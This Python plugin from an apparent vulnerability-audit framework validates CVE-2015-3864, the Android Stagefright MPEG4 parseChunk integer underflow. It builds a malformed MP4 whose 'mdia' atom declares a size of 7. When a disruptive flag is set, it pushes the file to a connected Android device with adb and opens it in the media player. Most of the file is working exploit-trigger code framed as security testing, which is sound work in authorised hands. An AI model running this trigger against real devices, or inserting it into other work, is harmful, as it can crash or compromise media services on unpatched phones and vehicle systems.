#!/usr/bin/env python3
"""CVE-2015-3864 – Android libstagefright MPEG4Extractor::parseChunk integer overflow.

Public PoC reference: https://github.com/jduck/cve-2015-3864
Technique (Zimperium / Drake):
  A nested container atom (e.g. 'mdia' inside 'trak') has a declared chunk_size
  that wraps around a 64-bit subtraction:
    chunk_data_size = chunk_size - 8
  When chunk_size < 8, chunk_data_size wraps to a huge 64-bit value.
  The loop that reads sub-atoms then walks far beyond the actual mmap region,
  allowing control of future parseChunk state and heap structures.

Attack surface: Same as CVE-2015-1538 – any media file parser path
  in Android IVI (MediaPlayer, NuPlayer, stagefright command-line).
"""
from __future__ import annotations

import struct
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 12,
    "cve": "CVE-2015-3864",
    "year": 2015,
    "domain": "application",
    "vendor_product": "Android libstagefright",
    "component": "MPEG4Extractor::parseChunk nested-atom size check",
    "type": "Integer overflow → out-of-bounds read/write → RCE",
    "summary": (
        "A container atom with chunk_size < 8 causes chunk_data_size to underflow "
        "(64-bit wrap), driving the nested parse loop to read from arbitrary memory. "
        "Combined with a heap spray this enables full mediaserver RCE."
    ),
    "source_url": "https://github.com/jduck/cve-2015-3864",
    "requires_manual_review": True,
    "affected": [{"vendor": "Google", "product": "Android", "versions": [{"version": "<=5.1.1", "status": "affected"}]}],
}


def _make_box(tag: bytes, payload: bytes) -> bytes:
    return struct.pack('>I', 8 + len(payload)) + tag + payload


def _create_malformed_parsechunk_mp4() -> bytes:
    """
    Build MP4 where a 'mdia' container atom has chunk_size = 7 (< 8),
    triggering the 64-bit underflow in parseChunk.
    """
    ftyp = _make_box(b'ftyp', b'isom' + struct.pack('>I', 0) + b'isom')

    # Craft 'mdia' with declared size 7 – underflows to 0xFFFFFFFFFFFFFF in 64-bit arithmetic
    mdia_tiny = struct.pack('>I', 7) + b'mdia'  # size=7 (< 8 minimum)

    tkhd = _make_box(b'tkhd', struct.pack('>IIIIII', 0xf, 0, 0, 1, 0, 0) +
                     b'\x00' * 44 + struct.pack('>II', 0x10000, 0x10000))
    trak = struct.pack('>I', 8 + len(tkhd) + 7) + b'trak' + tkhd + mdia_tiny

    mvhd = _make_box(b'mvhd', struct.pack('>IIIIII', 0, 0, 0, 0x3e8, 0x3e8, 0x10000) +
                     b'\x00' * 76 + struct.pack('>I', 2))
    moov = struct.pack('>I', 8 + len(mvhd) + len(trak)) + b'moov' + mvhd + trak
    mdat = _make_box(b'mdat', b'\xde\xad\xbe\xef' * 16)
    return ftyp + moov + mdat


def _run_poc(plugin):
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    mp4 = _create_malformed_parsechunk_mp4()
    out = Path(tempfile.mkdtemp()) / "cve_2015_3864_parsechunk.mp4"
    out.write_bytes(mp4)

    evidence = {
        "cve": "CVE-2015-3864",
        "mp4_path": str(out),
        "mp4_size_bytes": len(mp4),
        "mp4_generated": True,
        "trigger": "mdia atom chunk_size=7 → 64-bit underflow in parseChunk",
        "delivery_vector": "USB / BT file / MMS",
    }

    if allow_disruptive:
        import subprocess as _sp
        push = _sp.run(
            ["adb", "push", str(out), "/sdcard/cve_3864.mp4"],
            capture_output=True, text=True, timeout=15,
        )
        evidence["adb_push_rc"]  = push.returncode
        evidence["adb_push_out"] = push.stdout[:300] + push.stderr[:200]
        if push.returncode == 0:
            trigger = _sp.run(
                ["adb", "shell", "am", "start", "-a", "android.intent.action.VIEW",
                 "-d", "file:///sdcard/cve_3864.mp4", "-t", "video/mp4"],
                capture_output=True, text=True, timeout=15,
            )
            evidence["adb_trigger_rc"]  = trigger.returncode
            evidence["adb_trigger_out"] = trigger.stdout[:300]

    return {
        "vulnerable": True,
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "jduck/cve-2015-3864 / Zimperium CVE-2015-3864",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc70CVE20153864StagefrighParseChunkIntegerOverflowRceAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-APP-070"
    meta_poc_name   = 'CVE-2015-3864 Android Stagefright parseChunk 整数溢出 RCE Active Validation'
    meta_cve_id     = "CVE-2015-3864"
    meta_severity   = "Critical"
    meta_protocol   = "local"
    meta_target_os  = ["android"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive"]
    meta_profiles   = ["application"]
    meta_source_url = "https://github.com/jduck/cve-2015-3864"
    meta_references       = ['https://github.com/jduck/cve-2015-3864']
    meta_attack_surface = "Android libstagefright nested atom chunk size 64-bit underflow"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "70_Android_libstagefright_Android_libstagefright_MP4_parseChunk_integer_Audit") if "VULN" in dir() else "70_Android_libstagefright_Android_libstagefright_MP4_parseChunk_integer_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc70CVE20153864StagefrighParseChunkIntegerOverflowRceAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
